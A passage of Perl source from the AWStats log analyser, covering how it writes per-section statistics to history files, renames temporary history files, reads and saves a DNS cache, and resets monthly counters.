			  . int( $_url_k{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_url_e{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_url_x{$_} || 0 )
			  . "${xmlre}\n";
		}
		foreach ( keys %_url_p ) {
			if ( $keysinkeylist{$_} ) { next; }
			my $newkey = $_;
			$newkey =~ s/([^:])\/\//$1\//g
			  ; # Because some targeted url were taped with 2 / (Ex: //rep//file.htm). We must keep http://rep/file.htm
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($newkey)
			  . "${xmlrs}"
			  . int( $_url_p{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_url_k{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_url_e{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_url_x{$_} || 0 )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_SIDER${xmlee}\n";
	}
	if ( $sectiontosave eq 'filetypes' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP
"# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_FILETYPES${xmlbs}"
		  . ( scalar keys %_filetypes_h )
		  . "${xmlbe}\n";
		foreach ( keys %_filetypes_h ) {
			my $hits        = $_filetypes_h{$_}      || 0;
			my $bytes       = $_filetypes_k{$_}      || 0;
			my $bytesbefore = $_filetypes_gz_in{$_}  || 0;
			my $bytesafter  = $_filetypes_gz_out{$_} || 0;
			print HISTORYTMP
"${xmlrb}$_${xmlrs}$hits${xmlrs}$bytes${xmlrs}$bytesbefore${xmlrs}$bytesafter${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_FILETYPES${xmlee}\n";
	}
	if ( $sectiontosave eq 'downloads' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# Downloads - Hits - Bandwidth\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_DOWNLOADS${xmlbs}"
		  . ( scalar keys %_downloads )
		  . "${xmlbe}\n";
		for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($u)
			  . "${xmlrs}"
			  . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_HITS'} || 0)
			  . "${xmlrs}"
			  . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_206'} || 0)
			  ."${xmlrs}"
			  . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_SIZE'} || 0)
			  ."${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_DOWNLOADS${xmlee}\n";
	}
	if ( $sectiontosave eq 'os' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# OS ID - Hits\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_OS ID - Hits - Pages${xmlbs}"
		  . ( scalar keys %_os_h )
		  . "${xmlbe}\n";
		foreach ( keys %_os_h ) {
			my $hits        = $_os_h{$_}      || 0;
			my $pages       = $_os_p{$_}      || 0;
			print HISTORYTMP "${xmlrb}$_${xmlrs}$hits${xmlrs}$pages${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_OS${xmlee}\n";
	}
	if ( $sectiontosave eq 'browser' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# Browser ID - Hits - Pages\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_BROWSER${xmlbs}"
		  . ( scalar keys %_browser_h )
		  . "${xmlbe}\n";
		foreach ( keys %_browser_h ) {
			my $hits        = $_browser_h{$_}      || 0;
			my $pages       = $_browser_p{$_}      || 0;
			print HISTORYTMP "${xmlrb}$_${xmlrs}$hits${xmlrs}$pages${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_BROWSER${xmlee}\n";
	}
	if ( $sectiontosave eq 'screensize' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# Screen size - Hits\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_SCREENSIZE${xmlbs}"
		  . ( scalar keys %_screensize_h )
		  . "${xmlbe}\n";
		foreach ( keys %_screensize_h ) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}$_screensize_h{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_SCREENSIZE${xmlee}\n";
	}

	# Referer
	if ( $sectiontosave eq 'unknownreferer' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# Unknown referer OS - Last visit date\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_UNKNOWNREFERER${xmlbs}"
		  . ( scalar keys %_unknownreferer_l )
		  . "${xmlbe}\n";
		foreach ( keys %_unknownreferer_l ) {
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($_)
			  . "${xmlrs}$_unknownreferer_l{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_UNKNOWNREFERER${xmlee}\n";
	}
	if ( $sectiontosave eq 'unknownrefererbrowser' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# Unknown referer Browser - Last visit date\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_UNKNOWNREFERERBROWSER${xmlbs}"
		  . ( scalar keys %_unknownrefererbrowser_l )
		  . "${xmlbe}\n";
		foreach ( keys %_unknownrefererbrowser_l ) {
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($_)
			  . "${xmlrs}$_unknownrefererbrowser_l{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_UNKNOWNREFERERBROWSER${xmlee}\n";
	}
	if ( $sectiontosave eq 'origin' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# Origin - Pages - Hits \n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_ORIGIN${xmlbs}6" . "${xmlbe}\n";
		print HISTORYTMP "${xmlrb}From0${xmlrs}"
		  . int( $_from_p[0] )
		  . "${xmlrs}"
		  . int( $_from_h[0] )
		  . "${xmlre}\n";
		print HISTORYTMP "${xmlrb}From1${xmlrs}"
		  . int( $_from_p[1] )
		  . "${xmlrs}"
		  . int( $_from_h[1] )
		  . "${xmlre}\n";
		print HISTORYTMP "${xmlrb}From2${xmlrs}"
		  . int( $_from_p[2] )
		  . "${xmlrs}"
		  . int( $_from_h[2] )
		  . "${xmlre}\n";
		print HISTORYTMP "${xmlrb}From3${xmlrs}"
		  . int( $_from_p[3] )
		  . "${xmlrs}"
		  . int( $_from_h[3] )
		  . "${xmlre}\n";
		print HISTORYTMP "${xmlrb}From4${xmlrs}"
		  . int( $_from_p[4] )
		  . "${xmlrs}"
		  . int( $_from_h[4] )
		  . "${xmlre}\n";    # Same site
		print HISTORYTMP "${xmlrb}From5${xmlrs}"
		  . int( $_from_p[5] )
		  . "${xmlrs}"
		  . int( $_from_h[5] )
		  . "${xmlre}\n";    # News
		print HISTORYTMP "${xmleb}END_ORIGIN${xmlee}\n";
	}
	if ( $sectiontosave eq 'sereferrals' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# Search engine referers ID - Pages - Hits\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_SEREFERRALS${xmlbs}"
		  . ( scalar keys %_se_referrals_h )
		  . "${xmlbe}\n";
		foreach ( keys %_se_referrals_h ) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_se_referrals_p{$_} || 0 )
			  . "${xmlrs}$_se_referrals_h{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_SEREFERRALS${xmlee}\n";
	}
	if ( $sectiontosave eq 'pagerefs' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP
"<section id='$sectiontosave'><sortfor>$MaxNbOf{'RefererShown'}</sortfor><comment>\n";
		}
		print HISTORYTMP "# External page referers - Pages - Hits\n";
		print HISTORYTMP
"# The $MaxNbOf{'RefererShown'} first Pages must be first (order not required for others)\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_PAGEREFS${xmlbs}"
		  . ( scalar keys %_pagesrefs_h )
		  . "${xmlbe}\n";

# We save page list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList(
			$MaxNbOf{'RefererShown'}, $MinHit{'Refer'},
			\%_pagesrefs_h,           \%_pagesrefs_p
		);
		%keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			my $newkey = $_;
			$newkey =~ s/^http(s|):\/\/([^\/]+)\/$/http$1:\/\/$2/i
			  ; # Remove / at end of http://.../ but not at end of http://.../dir/
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($newkey)
			  . "${xmlrs}"
			  . int( $_pagesrefs_p{$_} || 0 )
			  . "${xmlrs}$_pagesrefs_h{$_}${xmlre}\n";
		}
		foreach ( keys %_pagesrefs_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			my $newkey = $_;
			$newkey =~ s/^http(s|):\/\/([^\/]+)\/$/http$1:\/\/$2/i
			  ; # Remove / at end of http://.../ but not at end of http://.../dir/
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($newkey)
			  . "${xmlrs}"
			  . int( $_pagesrefs_p{$_} || 0 )
			  . "${xmlrs}$_pagesrefs_h{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_PAGEREFS${xmlee}\n";
	}
	if ( $sectiontosave eq 'searchwords' ) {

		# Save phrases section
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP
"<section id='$sectiontosave'><sortfor>$MaxNbOf{'KeyphrasesShown'}</sortfor><comment>\n";
		}
		print HISTORYTMP "# Search keyphrases - Number of search\n";
		print HISTORYTMP
"# The $MaxNbOf{'KeyphrasesShown'} first number of search must be first (order not required for others)\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_SEARCHWORDS${xmlbs}"
		  . ( scalar keys %_keyphrases )
		  . "${xmlbe}\n";

		# We will also build _keywords
		%_keywords = ();

# We save key list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'KeywordsShown'},
			$MinHit{'Keyword'}, \%_keyphrases, \%_keyphrases );
		%keysinkeylist = ();
		foreach my $key (@keylist) {
			$keysinkeylist{$key} = 1;
			my $keyphrase = $key;
			$keyphrase =~ tr/ /\+/s;
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($keyphrase)
			  . "${xmlrs}"
			  . $_keyphrases{$key}
			  . "${xmlre}\n";
			foreach ( split( /\+/, $key ) ) {
				$_keywords{$_} += $_keyphrases{$key};
			}    # To init %_keywords
		}
		foreach my $key ( keys %_keyphrases ) {
			if ( $keysinkeylist{$key} ) { next; }
			my $keyphrase = $key;
			$keyphrase =~ tr/ /\+/s;
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($keyphrase)
			  . "${xmlrs}"
			  . $_keyphrases{$key}
			  . "${xmlre}\n";
			foreach ( split( /\+/, $key ) ) {
				$_keywords{$_} += $_keyphrases{$key};
			}    # To init %_keywords
		}
		print HISTORYTMP "${xmleb}END_SEARCHWORDS${xmlee}\n";

		# Now save keywords section
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP
"<section id='keywords'><sortfor>$MaxNbOf{'KeywordsShown'}</sortfor><comment>\n";
		}
		print HISTORYTMP "# Search keywords - Number of search\n";
		print HISTORYTMP
"# The $MaxNbOf{'KeywordsShown'} first number of search must be first (order not required for others)\n";
		$ValueInFile{"keywords"} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_KEYWORDS${xmlbs}"
		  . ( scalar keys %_keywords )
		  . "${xmlbe}\n";

# We save key list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'KeywordsShown'},
			$MinHit{'Keyword'}, \%_keywords, \%_keywords );
		%keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			my $keyword = $_;
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($keyword)
			  . "${xmlrs}"
			  . $_keywords{$_}
			  . "${xmlre}\n";
		}
		foreach ( keys %_keywords ) {
			if ( $keysinkeylist{$_} ) { next; }
			my $keyword = $_;
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($keyword)
			  . "${xmlrs}"
			  . $_keywords{$_}
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_KEYWORDS${xmlee}\n";

	}

	# Other - Errors
	if ( $sectiontosave eq 'cluster' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# Cluster ID - Pages - Hits - Bandwidth\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_CLUSTER${xmlbs}"
		  . ( scalar keys %_cluster_h )
		  . "${xmlbe}\n";
		foreach ( keys %_cluster_h ) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_cluster_p{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_cluster_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_cluster_k{$_} || 0 )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_CLUSTER${xmlee}\n";
	}
	if ( $sectiontosave eq 'misc' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# Misc ID - Pages - Hits - Bandwidth\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_MISC${xmlbs}"
		  . ( scalar keys %MiscListCalc )
		  . "${xmlbe}\n";
		foreach ( keys %MiscListCalc ) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_misc_p{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_misc_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_misc_k{$_} || 0 )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_MISC${xmlee}\n";
	}
	if ( $sectiontosave eq 'errors' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
		}
		print HISTORYTMP "# Errors - Hits - Bandwidth\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_ERRORS${xmlbs}"
		  . ( scalar keys %_errors_h )
		  . "${xmlbe}\n";
		foreach ( keys %_errors_h ) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}$_errors_h{$_}${xmlrs}"
			  . int( $_errors_k{$_} || 0 )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_ERRORS${xmlee}\n";
	}

	# Other - Trapped errors
	foreach my $code ( keys %TrapInfosForHTTPErrorCodes ) {
		if ( $sectiontosave eq "sider_$code" ) {
			print HISTORYTMP "\n";
			if ($xml) {
				print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
			}
			print HISTORYTMP
			  "# URL with $code errors - Hits"
			  . ($ShowHTTPErrorsPageDetail =~ /R/i ? " - Last URL referrer" : '')
			  . ($ShowHTTPErrorsPageDetail =~ /H/i ? " - Host" : '')
			  . "\n";

			$ValueInFile{$sectiontosave} = tell HISTORYTMP;
			print HISTORYTMP "${xmlbb}BEGIN_SIDER_$code${xmlbs}"
			  . ( scalar keys %{$_sider_h{$code}} )
			  . "${xmlbe}\n";
			foreach ( keys %{$_sider_h{$code}} ) {
				my $newkey = $_;
				my $newreferer = $_referer_h{$code}{$_} || '';
				my $newhost = $_err_host_h{$code}{$_} || '';
				print HISTORYTMP "${xmlrb}"
				  . XMLEncodeForHisto($newkey)
				  . "${xmlrs}$_sider_h{ $code }{$_}"
				  . ($ShowHTTPErrorsPageDetail =~ /R/i ? "${xmlrs}" . XMLEncodeForHisto($newreferer) : '')
				  . ($ShowHTTPErrorsPageDetail =~ /H/i ? "${xmlrs}" . XMLEncodeForHisto($newhost) : '')
				  . "${xmlre}\n";
			}
			print HISTORYTMP "${xmleb}END_SIDER_$code${xmlee}\n";
		}
	}

	# Other - Extra stats sections
	foreach my $extranum ( 1 .. @ExtraName - 1 ) {
		if ( $sectiontosave eq "extra_$extranum" ) {
			print HISTORYTMP "\n";
			if ($xml) {
				print HISTORYTMP
"<section id='$sectiontosave'><sortfor>$MaxNbOfExtra[$extranum]</sortfor><comment>\n";
			}
			print HISTORYTMP
			  "# Extra key - Pages - Hits - Bandwidth - Last access\n";
			print HISTORYTMP
			  "# The $MaxNbOfExtra[$extranum] first number of hits are first\n";
			$ValueInFile{$sectiontosave} = tell HISTORYTMP;
			print HISTORYTMP "${xmlbb}BEGIN_EXTRA_$extranum${xmlbs}"
			  . scalar( keys %{ '_section_' . $extranum . '_h' } )
			  . "${xmlbe}\n";
			&BuildKeyList(
				$MaxNbOfExtra[$extranum],
				$MinHitExtra[$extranum],
				\%{ '_section_' . $extranum . '_h' },
				\%{ '_section_' . $extranum . '_p' }
			);
			%keysinkeylist = ();
			foreach (@keylist) {
				$keysinkeylist{$_} = 1;
				my $page       = ${ '_section_' . $extranum . '_p' }{$_} || 0;
				my $bytes      = ${ '_section_' . $extranum . '_k' }{$_} || 0;
				my $lastaccess = ${ '_section_' . $extranum . '_l' }{$_} || '';
				print HISTORYTMP "${xmlrb}"
				  . XMLEncodeForHisto($_)
				  . "${xmlrs}$page${xmlrs}",
				  ${ '_section_' . $extranum . '_h' }{$_},
				  "${xmlrs}$bytes${xmlrs}$lastaccess${xmlre}\n";
				next;
			}
			foreach ( keys %{ '_section_' . $extranum . '_h' } ) {
				if ( $keysinkeylist{$_} ) { next; }
				my $page       = ${ '_section_' . $extranum . '_p' }{$_} || 0;
				my $bytes      = ${ '_section_' . $extranum . '_k' }{$_} || 0;
				my $lastaccess = ${ '_section_' . $extranum . '_l' }{$_} || '';
				print HISTORYTMP "${xmlrb}"
				  . XMLEncodeForHisto($_)
				  . "${xmlrs}$page${xmlrs}",
				  ${ '_section_' . $extranum . '_h' }{$_},
				  "${xmlrs}$bytes${xmlrs}$lastaccess${xmlre}\n";
				next;
			}
			print HISTORYTMP "${xmleb}END_EXTRA_$extranum${xmlee}\n";
		}
	}

	# Other - Plugin sections
	if ( $AtLeastOneSectionPlugin && $sectiontosave =~ /^plugin_(\w+)$/i ) {
		my $pluginname = $1;
		if ( $PluginsLoaded{'SectionInitHashArray'}{"$pluginname"} ) {

#   		my $function="SectionWriteHistory_$pluginname(\$xml,\$xmlbb,\$xmlbs,\$xmlbe,\$xmlrb,\$xmlrs,\$xmlre,\$xmleb,\$xmlee)";
#  		    eval("$function");
			my $function = "SectionWriteHistory_$pluginname";
			&$function(
				$xml,   $xmlbb, $xmlbs, $xmlbe, $xmlrb,
				$xmlrs, $xmlre, $xmleb, $xmlee
			);
		}
	}

	%keysinkeylist = ();
}

#--------------------------------------------------------------------
# Function:     Rename all tmp history file into history
# Parameters:   None
# Input:        $DirData $PROG $FileSuffix
#               $KeepBackupOfHistoricFile $SaveDatabaseFilesWithPermissionsForEveryone
# Output:       None
# Return:       1 Ok, 0 at least one error (tmp files are removed)
#--------------------------------------------------------------------
sub Rename_All_Tmp_History {
	my $pid      = $$;
	my $renameok = 1;

	if ($Debug) {
		debug("Call to Rename_All_Tmp_History (FileSuffix=$FileSuffix)");
	}

	opendir( DIR, "$DirData" );

	my $datemask;
	if    ( $DatabaseBreak eq 'month' ) { $datemask = '\d\d\d\d\d\d'; }
	elsif ( $DatabaseBreak eq 'year' )  { $datemask = '\d\d\d\d'; }
	elsif ( $DatabaseBreak eq 'day' )   { $datemask = '\d\d\d\d\d\d\d\d'; }
	elsif ( $DatabaseBreak eq 'hour' )  { $datemask = '\d\d\d\d\d\d\d\d\d\d'; }
	if ($Debug) {
		debug(
"Scan for temp history files to rename into DirData='$DirData' with mask='$datemask'"
		);
	}

	my $regfilesuffix = quotemeta($FileSuffix);
	foreach ( grep /^$PROG($datemask)$regfilesuffix\.tmp\.$pid$/,
		file_filt sort readdir DIR )
	{
		/^$PROG($datemask)$regfilesuffix\.tmp\.$pid$/;
		if ($renameok) {    # No rename error yet
			if ($Debug) {
				debug(
" Rename new tmp history file $PROG$1$FileSuffix.tmp.$$ into $PROG$1$FileSuffix.txt",
					1
				);
			}
			if ( -s "$DirData/$PROG$1$FileSuffix.tmp.$$" )
			{               # Rename tmp files if size > 0
				if ($KeepBackupOfHistoricFiles) {
					if ( -s "$DirData/$PROG$1$FileSuffix.txt" )
					{       # History file already exists. We backup it
						if ($Debug) {
							debug(
"  Make a backup of old history file into $PROG$1$FileSuffix.bak before",
								1
							);
						}

#if (FileCopy("$DirData/$PROG$1$FileSuffix.txt","$DirData/$PROG$1$FileSuffix.bak")) {
						if (
							rename(
								"$DirData/$PROG$1$FileSuffix.txt",
								"$DirData/$PROG$1$FileSuffix.bak"
							) == 0
						  )
						{
							warning(
"Warning: Failed to make a backup of \"$DirData/$PROG$1$FileSuffix.txt\" into \"$DirData/$PROG$1$FileSuffix.bak\"."
							);
						}
						if ($SaveDatabaseFilesWithPermissionsForEveryone) {
							chmod 0666, "$DirData/$PROG$1$FileSuffix.bak";
						}
					}
					else {
						if ($Debug) {
							debug( "  No need to backup old history file", 1 );
						}
					}
				}
				if (
					rename(
						"$DirData/$PROG$1$FileSuffix.tmp.$$",
						"$DirData/$PROG$1$FileSuffix.txt"
					) == 0
				  )
				{
					$renameok =
					  0;    # At least one error in renaming working files
					        # Remove tmp file
					unlink "$DirData/$PROG$1$FileSuffix.tmp.$$";
					warning(
"Warning: Failed to rename \"$DirData/$PROG$1$FileSuffix.tmp.$$\" into \"$DirData/$PROG$1$FileSuffix.txt\".\nWrite permissions on \"$PROG$1$FileSuffix.txt\" might be wrong"
						  . (
							$ENV{'GATEWAY_INTERFACE'}
							? " for an 'update from web'"
							: ""
						  )
						  . " or file might be opened."
					);
					next;
				}
				if ($SaveDatabaseFilesWithPermissionsForEveryone) {
					chmod 0666, "$DirData/$PROG$1$FileSuffix.txt";
				}
			}
		}
		else {    # Because of rename error, we remove all remaining tmp files
			unlink "$DirData/$PROG$1$FileSuffix.tmp.$$";
		}
	}
	close DIR;
	return $renameok;
}

#------------------------------------------------------------------------------
# Function:     Load DNS cache file entries into a memory hash array
# Parameters:	Hash array ref to load into,
#               File name to load,
#				File suffix to use
#               Save to a second plugin file if not up to date
# Input:		None
# Output:		Hash array is loaded
# Return:		1 No DNS Cache file found, 0 OK
#------------------------------------------------------------------------------
sub Read_DNS_Cache {
	my $hashtoload   = shift;
	my $dnscachefile = shift;
	my $filesuffix   = shift;
	my $savetohash   = shift;

	my $dnscacheext = '';
	my $filetoload  = '';
	my $timetoload  = time();

	if ($Debug) { debug("Call to Read_DNS_Cache [file=\"$dnscachefile\"]"); }
	if ( $dnscachefile =~ s/(\.\w+)$// ) { $dnscacheext = $1; }
	foreach my $dir ( "$DirData", ".", "" ) {
		my $searchdir = $dir;
		if (   $searchdir
			&& ( !( $searchdir =~ /\/$/ ) )
			&& ( !( $searchdir =~ /\\$/ ) ) )
		{
			$searchdir .= "/";
		}
		if ( -f "${searchdir}$dnscachefile$filesuffix$dnscacheext" ) {
			$filetoload = "${searchdir}$dnscachefile$filesuffix$dnscacheext";
		}

		# Plugin call : Change filetoload
		if ( $PluginsLoaded{'SearchFile'}{'hashfiles'} ) {
			SearchFile_hashfiles(
				$searchdir,   $dnscachefile, $filesuffix,
				$dnscacheext, $filetoload
			);
		}
		if ($filetoload) { last; }    # We found a file to load
	}

	if ( !$filetoload ) {
		if ($Debug) { debug(" No DNS Cache file found"); }
		return 1;
	}

	# Plugin call : Load hashtoload
	if ( $PluginsLoaded{'LoadCache'}{'hashfiles'} ) {
		LoadCache_hashfiles( $filetoload, $hashtoload );
	}
	if ( !scalar keys %$hashtoload ) {
		open( DNSFILE, "$filetoload" )
		  or error("Couldn't open DNS Cache file \"$filetoload\": $!");

#binmode DNSFILE;		# If we set binmode here, it seems that the load is broken on ActiveState 5.8
# This is a fast way to load with regexp
		%$hashtoload =
		  map( /^(?:\d{0,10}\s+)?([0-9A-F:\.]+)\s+([^\s]+)$/oi, <DNSFILE> );
		close DNSFILE;
		if ($savetohash) {

	# Plugin call : Save hash file (all records) with test if up to date to save
			if ( $PluginsLoaded{'SaveHash'}{'hashfiles'} ) {
				SaveHash_hashfiles( $filetoload, $hashtoload, 1, 0 );
			}
		}
	}
	if ($Debug) {
		debug(
			" Loaded "
			  . ( scalar keys %$hashtoload )
			  . " items from $filetoload in "
			  . ( time() - $timetoload )
			  . " seconds.",
			1
		);
	}
	return 0;
}

#------------------------------------------------------------------------------
# Function:     Save a memory hash array into a DNS cache file
# Parameters:	Hash array ref to save,
#               File name to save,
#				File suffix to use
# Input:		None
# Output:		None
# Return:		0 OK, 1 Error
#------------------------------------------------------------------------------
sub Save_DNS_Cache_File {
	my $hashtosave   = shift;
	my $dnscachefile = shift;
	my $filesuffix   = shift;

	my $dnscacheext    = '';
	my $filetosave     = '';
	my $timetosave     = time();
	my $nbofelemtosave = $NBOFLASTUPDATELOOKUPTOSAVE;
	my $nbofelemsaved  = 0;

	if ($Debug) {
		debug("Call to Save_DNS_Cache_File [file=\"$dnscachefile\"]");
	}
	if ( !scalar keys %$hashtosave ) {
		if ($Debug) { debug(" No data to save"); }
		return 0;
	}
	if ( $dnscachefile =~ s/(\.\w+)$// ) { $dnscacheext = $1; }
	$filetosave = "$dnscachefile$filesuffix$dnscacheext";

# Plugin call : Save hash file (only $NBOFLASTUPDATELOOKUPTOSAVE records) with no test if up to date
	if ( $PluginsLoaded{'SaveHash'}{'hashfiles'} ) {
		SaveHash_hashfiles( $filetosave, $hashtosave, 0, $nbofelemtosave,
			$nbofelemsaved );
		if ($SaveDatabaseFilesWithPermissionsForEveryone) {
			chmod 0666, "$filetosave";
		}
	}
	if ( !$nbofelemsaved ) {
		$filetosave = "$dnscachefile$filesuffix$dnscacheext";
		if ($Debug) {
			debug(
				" Save data "
				  . (
					$nbofelemtosave
					? "($nbofelemtosave records max)"
					: "(all records)"
				  )
				  . " into file $filetosave"
			);
		}
		if ( !open( DNSFILE, ">$filetosave" ) ) {
			warning(
"Warning: Failed to open for writing last update DNS Cache file \"$filetosave\": $!"
			);
			return 1;
		}
		binmode DNSFILE;
		my $starttimemin = int( $starttime / 60 );
		foreach my $key ( keys %$hashtosave ) {

			#if ($hashtosave->{$key} ne '*') {
			my $ipsolved = $hashtosave->{$key};
			print DNSFILE "$starttimemin\t$key\t"
			  . ( $ipsolved eq 'ip' ? '*' : $ipsolved )
			  . "\n";    # Change 'ip' to '*' for backward compatibility
			if ( ++$nbofelemsaved >= $NBOFLASTUPDATELOOKUPTOSAVE ) { last; }

			#}
		}
		close DNSFILE;

		if ($SaveDatabaseFilesWithPermissionsForEveryone) {
			chmod 0666, "$filetosave";
		}

	}
	if ($Debug) {
		debug(
			" Saved $nbofelemsaved items into $filetosave in "
			  . ( time() - $timetosave )
			  . " seconds.",
			1
		);
	}
	return 0;
}

#------------------------------------------------------------------------------
# Function:     Return time elapsed since last call in miliseconds
# Parameters:	0|1 (0 reset counter, 1 no reset)
# Input:		None
# Output:		None
# Return:		Number of miliseconds elapsed since last call
#------------------------------------------------------------------------------
sub GetDelaySinceStart {
	if (shift) { $StartSeconds = 0; }    # Reset chrono
	my ( $newseconds, $newmicroseconds ) = ( time(), 0 );

	# Plugin call : Return seconds and milliseconds
	if ( $PluginsLoaded{'GetTime'}{'timehires'} ) {
		GetTime_timehires( $newseconds, $newmicroseconds );
	}
	if ( !$StartSeconds ) {
		$StartSeconds      = $newseconds;
		$StartMicroseconds = $newmicroseconds;
	}
	return ( ( $newseconds - $StartSeconds ) * 1000 +
		  int( ( $newmicroseconds - $StartMicroseconds ) / 1000 ) );
}

#------------------------------------------------------------------------------
# Function:     Reset all variables whose name start with _ because a new month start
# Parameters:	None
# Input:        $YearRequired All variables whose name start with _
# Output:       All variables whose name start with _
# Return:		None
#------------------------------------------------------------------------------
sub Init_HashArray {
	if ($Debug) { debug("Call to Init_HashArray"); }

	# Reset global hash arrays
	%FirstTime           = %LastTime           = ();
	%MonthHostsKnown     = %MonthHostsUnknown  = ();
	%MonthVisits         = %MonthUnique        = ();
	%MonthPages          = %MonthHits          = %MonthBytes = ();
	%MonthNotViewedPages = %MonthNotViewedHits = %MonthNotViewedBytes = ();
